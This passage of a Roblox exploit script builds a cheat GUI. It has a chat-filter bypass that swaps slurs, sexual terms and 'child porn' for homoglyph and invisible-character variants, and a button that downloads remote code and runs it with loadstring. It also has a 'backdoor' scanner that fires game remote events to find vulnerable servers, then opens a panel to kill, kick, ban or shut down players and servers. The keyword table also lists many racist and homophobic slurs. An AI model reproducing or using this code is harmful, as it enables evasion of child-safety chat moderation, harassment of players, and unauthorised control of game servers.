						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			FloatSlash.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://708553116"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	WeirdZombieACTIVE = false
	WeirdZombie.MouseButton1Click:connect(function()
		WeirdZombieACTIVE = not WeirdZombieACTIVE
		if WeirdZombieACTIVE then
			WeirdZombie.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if WeirdZombieACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			WeirdZombie.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://746398327"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	DownSlashACTIVE = false
	DownSlash.MouseButton1Click:connect(function()
		DownSlashACTIVE = not DownSlashACTIVE
		if DownSlashACTIVE then
			DownSlash.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if DownSlashACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			DownSlash.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://675025795"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	PullACTIVE = false
	Pull.MouseButton1Click:connect(function()
		PullACTIVE = not PullACTIVE
		if PullACTIVE then
			Pull.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if PullACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			Pull.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://698251653"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	CircleArmACTIVE = false
	CircleArm.MouseButton1Click:connect(function()
		CircleArmACTIVE = not CircleArmACTIVE
		if CircleArmACTIVE then
			CircleArm.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if CircleArmACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			CircleArm.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://696096087"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	BendACTIVE = false
	Bend.MouseButton1Click:connect(function()
		BendACTIVE = not BendACTIVE
		if BendACTIVE then
			Bend.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if BendACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			Bend.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://675025570"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	RotateSlashACTIVE = false
	RotateSlash.MouseButton1Click:connect(function()
		RotateSlashACTIVE = not RotateSlashACTIVE
		if RotateSlashACTIVE then
			RotateSlash.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if RotateSlashACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			RotateSlash.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://754656200"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	FlingArmsACTIVE = false
	FlingArms.MouseButton1Click:connect(function()
		FlingArmsACTIVE = not FlingArmsACTIVE
		if FlingArmsACTIVE then
			FlingArms.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if FlingArmsACTIVE then
						track:Play(.1, 1, 10)
					end
				end
			end
		else
			track:Stop()
			FlingArms.BackgroundColor3 = rcol
		end
	end)
end)
	
FeChatB.Name = "FeChatB"
FeChatB.Parent = ScrollingFrame
FeChatB.Size = UDim2.new(0, 137, 0, 23)
FeChatB.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeChatB.Position = UDim2.new(0.0504385978, 0, 0.0932036042, 0)
FeChatB.BorderSizePixel = 0
FeChatB.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeChatB.TextColor3 = Color3.fromRGB(0, 0, 0)
FeChatB.Text = "Fe Chat Bypass"
FeChatB.TextSize = 14
FeChatB.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeChatB.MouseButton1Down:Connect(function()
	repeat task.wait() until game:IsLoaded()
        NotifyModule:Notify("This FE Chat Bypass Was No Anti Chat Logging So Be Careful", 10)
	local TCS = game:GetService("TextChatService")
	local CoreGui = game:GetService("CoreGui")
	local RStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local HttpService = game:GetService("HttpService")
	local UserInputService = game:GetService("UserInputService")

	local LocalPlayer = Players.LocalPlayer
	local PlayerGui = LocalPlayer.PlayerGui

	local isLegacy = TCS.ChatVersion == Enum.ChatVersion.LegacyChatService
	local ChatBar = CoreGui:FindFirstChild("TextBoxContainer", true) or PlayerGui:FindFirstChild("Chat"):FindFirstChild("ChatBar", true)
	ChatBar = ChatBar:FindFirstChild("TextBox") or ChatBar

	local Keywords = {
		--phrases
		{"lil nigga", "li⁥ӏn⁥і⁥ggа"},
		{"you fucking retard", "yo⁥⁥⁥⁥⁥⁥uf⁥⁥⁥⁥⁥⁥⁥⁥⁥u⁥⁥⁥⁥⁥⁥⁥⁥⁥c⁥⁥⁥⁥⁥⁥⁥⁥⁥k⁥⁥i⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥n⁥gr⁥⁥⁥⁥⁥⁥e⁥⁥t⁥⁥⁥⁥⁥⁥ar⁥⁥⁥⁥⁥⁥d"},
		{"you fucking nigger", "yоufu⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥сk⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥іn⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥gn⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥ggе⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥r"},
		{"fucking nigger", "fu⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥сk⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥іn⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥gn⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥ggе⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥r"},

		--only work in sentence (sometimes)
		{"fucking", "fu⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥сk⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥іn⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥g"},
		{"nigger", "n⁥⁥⁥⁥⁥і⁥⁥⁥⁥ɡ⁥⁥⁥⁥ɡ⁥⁥⁥⁥е⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥r"}, -- changed in v2.01
		{"faggot", "f⁥⁥⁥⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥ɡɡ⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥o⁥⁥⁥⁥⁥⁥⁥⁥t"},
		{"nigga", "n⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥ggа"},
		{"retard", "r⁥⁥⁥⁥⁥⁥e⁥⁥t⁥⁥⁥⁥⁥⁥ar⁥⁥⁥⁥⁥⁥d"},
		{"child porn", "ch⁥⁥⁥⁥⁥⁥⁥⁥⁥iӏdpо⁥⁥⁥⁥⁥⁥⁥⁥⁥rn"},
		{"snapchat", "ѕnарсһаt"},
		{"snap", "ѕnар"},
		{"instagram", "іnѕtаgrаm"},
		{"insta", "іnѕtа"},

		--yay
		{"fuck", "F⁥⁥⁥⁥⁥U⁥⁥⁥⁥⁥СΚ"}, -- changed in v2
		{"up", "u⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥p"},
		{"shut", "s⁥⁥⁥⁥⁥⁥⁥⁥һu⁥⁥⁥⁥⁥⁥⁥⁥t"},
		{"butt", "butt"},
		{"dirty", "dіrtу"},
		{"rape", "⁥⁥⁥⁥⁥r⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥р⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥"},
		{"sex", "⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥х"}, -- changed in v2
		{"whore", "⁥⁥⁥⁥⁥w⁥⁥⁥⁥⁥һ⁥⁥⁥⁥⁥o⁥⁥⁥⁥⁥r⁥⁥⁥⁥⁥e⁥⁥⁥⁥⁥"},
		{"slut", "⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥ӏ⁥⁥⁥⁥⁥u⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥"},
		{"pornhub", "⁥⁥⁥⁥⁥ро⁥⁥⁥⁥⁥r⁥⁥⁥⁥⁥n⁥⁥⁥⁥⁥һ⁥⁥⁥⁥⁥u⁥⁥⁥⁥⁥b⁥⁥⁥⁥⁥"},
		{"cock", "cо⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥сk"}, -- changed in v2
		{"pussy", "⁥⁥⁥⁥⁥р⁥⁥⁥⁥⁥u⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥у⁥⁥⁥⁥⁥"},
		{"naked", "⁥⁥⁥⁥⁥n⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥k⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥d⁥⁥⁥⁥⁥"},
		{"titties", "⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥"},
		{"titty", "⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥y⁥⁥⁥⁥⁥"},
		{"tits", "⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥s⁥⁥⁥⁥⁥"},
		{"cum", "⁥⁥⁥⁥⁥с⁥⁥⁥⁥⁥u⁥⁥⁥⁥⁥m⁥⁥⁥⁥⁥"},
		{"kkk", "⁥⁥⁥⁥⁥К⁥⁥⁥⁥⁥К⁥⁥⁥⁥⁥К⁥⁥⁥⁥⁥"},
		{"rizz", "r⁥⁥⁥⁥⁥i⁥⁥⁥⁥⁥z⁥⁥⁥⁥⁥z"},
		{"ass", "⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥"},
		{"vagina", "⁥⁥⁥⁥⁥v⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥g⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥n⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥"},
		{"nudes", "⁥⁥⁥⁥⁥n⁥⁥⁥⁥⁥u⁥⁥⁥⁥⁥d⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥"},
		{"hoe", "⁥⁥⁥⁥⁥һ⁥⁥⁥⁥⁥о⁥⁥⁥⁥⁥e"},
		{"blowjob", "⁥⁥⁥⁥b⁥⁥⁥⁥ӏ⁥⁥⁥⁥о⁥⁥⁥⁥w⁥⁥⁥⁥ј⁥⁥⁥⁥o⁥⁥⁥⁥b⁥⁥⁥⁥"},
		{"femboy", "fеmbоу"},
		{"love", "⁥⁥⁥⁥⁥ӏ⁥⁥⁥⁥⁥о⁥⁥⁥⁥⁥v⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥"},
		{"kiss", "⁥⁥⁥⁥⁥k⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥"},
		{"discord", "dіѕсоrd"},
		{"porn", "⁥⁥⁥⁥⁥ро⁥⁥⁥⁥⁥r⁥⁥⁥⁥⁥n⁥⁥⁥⁥⁥"},
		{"damn", "dаmn"},
		{"anal", "аnаl"},
		{"zoophile", "zоорһіӏе"},
		{"lmao", "LМАО"},
		{"lmfao", "LМFАО"},
		{"george", "gеоrgе"},
		{"floyd", "flоуd"},
		{"sexual", "⁥⁥⁥⁥⁥ѕ⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥х⁥⁥⁥⁥⁥ual"},
		{"tiktok", "tіktоk"},
		{"twerk", "twеrk"},
		{"gay", "⁥⁥⁥⁥⁥g⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥у⁥⁥⁥⁥⁥"},
		{"black", "bӏасk"},
		{"suck", "ѕuсk"},
		{"heil", "һеіӏ"},
		{"nazi", "n⁥⁥⁥⁥⁥a⁥⁥⁥⁥⁥z⁥⁥⁥⁥i"},
		{"sperm", "ѕре⁥⁥⁥⁥⁥⁥⁥⁥rm"}, -- changed in v2
		{"hate", "һаtе"},
		{"balls", "bаӏӏѕ"},
		{"shit", "s⁥⁥⁥⁥⁥⁥⁥⁥һit"},
		{"bitch", "bi⁥⁥⁥⁥⁥⁥⁥⁥tсһ"},
		{"kill", "kіll"},
		{"yourself", "уоurѕеlf"},
		{"%.com", ".⁥⁥⁥⁥⁥с⁥⁥⁥⁥о⁥⁥⁥⁥⁥⁥m"},
		{"bastard", "bаѕtаrd"},
		{"panties", "раntіеѕ"},
		{"meth", "mеth"},
		{"weed", "wееd"},
		{"cunt", "с⁥⁥⁥⁥⁥unt"},
		{"penis", "реnіѕ"},
		{"pedo", "ре⁥⁥⁥⁥⁥⁥⁥⁥d⁥⁥⁥⁥⁥⁥⁥⁥о"},
		{"masturbate", "mаѕturbаtе"},
		{"moan", "mоаn"},
		{"kink", "kіnk"},
		{"fetish", "fеtіѕh"},
		{"horny", "hоrnу"},
		{"booty", "b⁥⁥⁥оо⁥⁥⁥t⁥⁥⁥у"},
		{"horny", "h⁥⁥⁥⁥⁥⁥⁥⁥оrnу"},
		{"commit", "соmmіt"},

		--suno's credit
		{"fap", "fаp"},
		{"hentai", "һentаі"},
		{"rule34", "ruӏe34"},
		{"r34", "⁥⁥⁥⁥⁥r⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥3⁥⁥⁥⁥⁥4"},
		{"xxx", "⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥xx⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥x⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥"},
		{"suicide", "⁥ѕuі⁥сіdе"},
		{"pp", "рр"},
		{"dick", "⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥d⁥⁥⁥⁥⁥і⁥⁥⁥⁥с⁥⁥⁥⁥⁥⁥⁥⁥k⁥⁥⁥⁥⁥"},
		{"crack", "сrасk"},
		{"heroin", "hеrоin"},
		{"boob", "b⁥⁥⁥оо⁥⁥⁥b"},
		{"boobies", "b⁥⁥⁥оо⁥⁥⁥b⁥⁥⁥іеѕ"},
		{"rapist", "⁥⁥⁥⁥⁥⁥⁥⁥rа⁥⁥⁥⁥⁥⁥⁥⁥p⁥іѕt"},
		{"cocaine", "c⁥о⁥⁥⁥⁥⁥⁥⁥⁥⁥ca⁥іnе"},
		{"do you have", "dо yоu h⁥аv⁥⁥⁥⁥⁥е⁥⁥⁥⁥"},
		{"hole", "hоl⁥е⁥⁥⁥⁥"},
		{"cocksucker", "cо⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥сksuck⁥еr"},
		{"twat", "twаt"},
		{"wanker", "wаnk⁥еr"},
		{"anus", "аnu⁥ѕ⁥⁥⁥⁥"},
		{"beaner", "⁥⁥⁥b⁥е⁥⁥⁥⁥⁥⁥аn⁥еr⁥⁥⁥⁥⁥⁥"},
		{"coon", "cо⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥о⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥n"},
		{"dildo", "dіld⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥о⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥"},
		{"hump", "h⁥⁥⁥⁥⁥u⁥⁥⁥⁥⁥mp"},
		{"jizz", "⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥j⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥izz⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥"},
		{" ho ", " h⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥о⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥ "},
		{"pregnant", "р⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥rе⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥gnа⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥nt"},
		{"impregnat", "іmрrеgnаt"},
		{"kunt", "⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥kun⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥t⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥"},
		{"queef", "qu⁥е⁥⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥f"},
		{"tard", "tаrd"},
		{"sexy", "⁥⁥⁥⁥⁥⁥⁥⁥⁥sехy⁥"},
		{"slutty", "⁥ѕӏuttу"},
		{"dumbass", "d⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥um⁥⁥⁥⁥⁥b⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥а⁥ѕ⁥ѕ"},
		{"moron", "m⁥оr⁥оn"},
		{"xxx", "⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥xx⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥x⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥"},
		{"fat", "fаt"},
		{"die", "⁥⁥⁥⁥⁥dі⁥⁥⁥⁥⁥е"},

		--new
		{"abortion", "аbоrtіоn"},
		{"jew", "јеw"},
		{"futa", "futа"},
		{"twink", "twіnk"},
		{"alcohol", "аlсоhоl"},
		{"schlong", "ѕсhlоng"},
		{"child predator", "ch⁥⁥⁥⁥⁥⁥⁥⁥⁥iӏdрrеdаtо⁥⁥⁥⁥⁥r"},
		{"fag", "f⁥⁥⁥⁥⁥⁥⁥⁥а⁥⁥⁥⁥⁥⁥⁥⁥ɡ"}, --rarely works
		{"molest", "mоlеѕt"},
		{"condom", "со⁥⁥⁥⁥⁥nd⁥⁥⁥⁥⁥о⁥⁥⁥⁥⁥m"},
		{"virgin", "νіrgіn"},
		{"torture", "tоrturе"},

		--custom
		{"example", "example"},

		--dont delete
		{" ", ""},
	}

--[[
    need to fix:
    lmao, lmfao, discord

    need to add:
    damn, slave
]]

	local Gen = function(Message)
		for _, info in Keywords do
			local real = info[1]
			local bypass = info[2]
			Message = Message:gsub(real, bypass)
		end
		return Message
	end

	local Chat = function(Message)
		if isLegacy then
			local ChatRemote = RStorage:FindFirstChild("SayMessageRequest", true)
			ChatRemote:FireServer(Message, "All")
		else
			local Channel = TCS.TextChannels.RBXGeneral
			Channel:SendAsync(Message)
		end
	end

	local Fake = function(Message)
		if isLegacy then
			Players:Chat(Message)
		else
			local Channel = TCS.TextChannels.RBXGeneral
			--Channel:SendAsync(("/e %s"):format(Message))
			-- ^^^ its too annoying
		end
	end

	local chars = {}
	for i=97,122 do chars[#chars+1]=string.char(i) end
	for i=65,90 do chars[#chars+1]=string.char(i) end

	local RNG = function(length)
		local str = ""
		for i = 1, length do
			str = str .. chars[math.random(#chars)]
		end
		return str
	end

	local ResetFilter = function()
		for i = 1, 10 do
			local GUID = RNG(i)
			local Filler = "i love asians so much"
			local Reset = ("%s %s"):format(GUID, Filler)
			task.spawn(function()
				Fake(Reset)
			end)
		end
	end

	local Connection = Instance.new("BindableFunction")

	for _, c in getconnections(ChatBar.FocusLost) do
		c:Disconnect()
	end

	ChatBar.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			Connection:Invoke(ChatBar.Text)
			ChatBar.Text = ""
		end
	end)

	Connection.OnInvoke = function(Message)
		Message = Gen(Message)
		Chat(Message)
		ResetFilter()
	end

	UserInputService.InputBegan:Connect(function(Input, GPE)
		if GPE or Input.KeyCode ~= Enum.KeyCode.Zero then return end

		NotifyModule:Notify("copied invite link to clipboard", 1)
		setclipboard("https://discord.com/invite/FRsmP9knVc")
	end)

	NotifyModule:Notify("heartasian's bypass v2 loaded ► press 0 to join discord for more exclusive scripts", 5)

end)

FeTelekineses.Name = "FeTelekineses"
FeTelekineses.Parent = ScrollingFrame
FeTelekineses.Size = UDim2.new(0, 137, 0, 23)
FeTelekineses.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeTelekineses.Position = UDim2.new(0.651315808, 0, 0.0445480719, 0)
FeTelekineses.BorderSizePixel = 0
FeTelekineses.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeTelekineses.TextColor3 = Color3.fromRGB(0, 0, 0)
FeTelekineses.Text = "Fe Telekineses"
FeTelekineses.TextSize = 14
FeTelekineses.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeTelekineses.MouseButton1Down:Connect(function()
        NotifyModule:Notify("Script By The Owner Of SAZXHUB", 5)
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
end)

FB.Name = "FB"
FB.Parent = ScrollingFrame
FB.Size = UDim2.new(0, 137, 0, 23)
FB.BorderColor3 = Color3.fromRGB(0, 0, 0)
FB.Position = UDim2.new(0.350877196, 0, 0.0919114947, 0)
FB.BorderSizePixel = 0
FB.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FB.TextColor3 = Color3.fromRGB(0, 0, 0)
FB.Text = "Fe Bypass (Backdoor)"
FB.TextSize = 14
FB.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FB.MouseButton1Down:Connect(function()
        NotifyModule:Notify("This Script Has Private", 2)
        wait(1)
        NotifyModule:Notify("But XXX Scripts Team Found it", 2)
        wait(1)
        NotifyModule:Notify("This Script Scans More BackDoor then Others One Executing Now", 3)
	local StarterGui = game:GetService("StarterGui")
	local showNotification = true

	function Notify(tl, t, d) 
		if showNotification == true then
			StarterGui:SetCore("SendNotification", {
				Title = tl;
				Text = t;
				Duration = d;
				Icon = "http://www.roblox.com/asset/?id=8388262491";
			})
		end
	end

	if game.CoreGui:FindFirstChild("destruct") then
		game.CoreGui.destruct:Destroy()
	end

	local BlurFX = Instance.new("BlurEffect")
	BlurFX.Size = 0
	BlurFX.Name = "Blur"
	BlurFX.Parent = workspace.CurrentCamera

	local function blurefct(siz)
		local TweenService = game:GetService("TweenService")
		local goal = {}
		goal.Size = siz

		local tweenInfo = TweenInfo.new(2)
		local tween = TweenService:Create(BlurFX, tweenInfo, goal)

		tween:Play()
	end

	local remote = "nil"
	local found = false
	local enable = false
	local sent = false
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

	local checkIn = {"Workspace", "ReplicatedStorage", "StarterGui", "CoreGui"}
	local names = {"Delete", "Deletar", "Remove", "Destroy", "Clean", "Clear","Bullet", "Bala", "Shoot", "Shot", "Fire", "Segway", "Handless", "Sword", "Attack"}
	if char then
		blurefct(20)
		Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
		for _, service in pairs(checkIn) do
			for i,v in pairs(game:GetService(service):GetDescendants()) do
				for _, str in pairs(names) do
					if string.match(v.Name, str) and v:IsA("RemoteEvent") then
						print("Checking " .. v.Name .. " from " .. service .. " service")
						local success, error = pcall(function()
							game:GetService("ReplicatedStorage")[v.Name]:FireServer(LocalPlayer.Character.Head)
							found = true
						end)
						if success then
							remote = game:GetService("ReplicatedStorage")[v.Name]
						end 
						wait(0.5)
						if not LocalPlayer.Character:FindFirstChild("Head") then
							enable = true
							sent = true
						end
					end
				end
			end
		end
	end

	if sent == false then
		Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
		blurefct(0)
	end

	function work(arg1)
		remote:FireServer(arg1)
	end

	function GetPlayer(String)
		local Found = {}
		local strl = String:lower()
		if strl == "all" then
			for i,v in pairs(game.Players:GetPlayers()) do
				table.insert(Found,v.Name)
			end
		elseif strl == "others" then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					table.insert(Found,v.Name)
				end
			end  
		elseif strl == "me" then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Name == game.Players.LocalPlayer.Name then
					table.insert(Found,v.Name)
				end
			end  
		else
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					table.insert(Found,v.Name)
				end
			end    
		end
		return Found    
	end
	if enable == true then
		blurefct(0)
		Notify("Destructed Hex", "Made by Luq and Luca", 10)
		local destruct = Instance.new("ScreenGui")
		local main = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		local line = Instance.new("Frame")
		local ImageLabel = Instance.new("ImageLabel")
		local scripts = Instance.new("ScrollingFrame")
		local UIGridLayout = Instance.new("UIGridLayout")
		local kill = Instance.new("TextButton")
		local kick = Instance.new("TextButton")
		local ban = Instance.new("TextButton")
		local unban = Instance.new("TextButton")
		local goto = Instance.new("TextButton")
		local view = Instance.new("TextButton")
		local unview = Instance.new("TextButton")
		local btools = Instance.new("TextButton")
		local nuke = Instance.new("TextButton")
		local naked = Instance.new("TextButton")
		local faceless = Instance.new("TextButton")
		local nolimbs = Instance.new("TextButton")
		local hatless = Instance.new("TextButton")
		local sink = Instance.new("TextButton")
		local rtools = Instance.new("TextButton")
		local stools = Instance.new("TextButton")
		local slock = Instance.new("TextButton")
		local player = Instance.new("TextBox")
		local ranims = Instance.new("TextButton")
		local ragdoll = Instance.new("TextButton")
		local shutdown = Instance.new("TextButton")
		local punish = Instance.new("TextButton")
		local rchassis = Instance.new("TextButton")

		--Properties:

		destruct.Name = "destruct"
		destruct.Parent = game.CoreGui
		destruct.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		main.Name = "main"
		main.Parent = destruct
		main.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
		main.BackgroundTransparency = 0.3
		main.BorderSizePixel = 0
		main.Position = UDim2.new(0.268847764, 0, 0.372854918, 0)
		main.Size = UDim2.new(0, 325, 0, 239)
		main.Active = true

		local UserInputService = game:GetService("UserInputService")

		local gui = main

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.05, true)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)

		TextLabel.Parent = main
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.BorderSizePixel = 0
		TextLabel.Position = UDim2.new(0.292307675, 0, 0, 0)
		TextLabel.Size = UDim2.new(0, 134, 0, 25)
		TextLabel.Font = Enum.Font.Roboto
		TextLabel.Text = "Destructed_Hex"
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 17.000

		line.Name = "line"
		line.Parent = main
		line.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
		line.BorderSizePixel = 0
		line.Position = UDim2.new(0, 0, 0.106986806, 0)
		line.Size = UDim2.new(0, 325, 0, 6)

		ImageLabel.Parent = main
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.BackgroundTransparency = 1.000
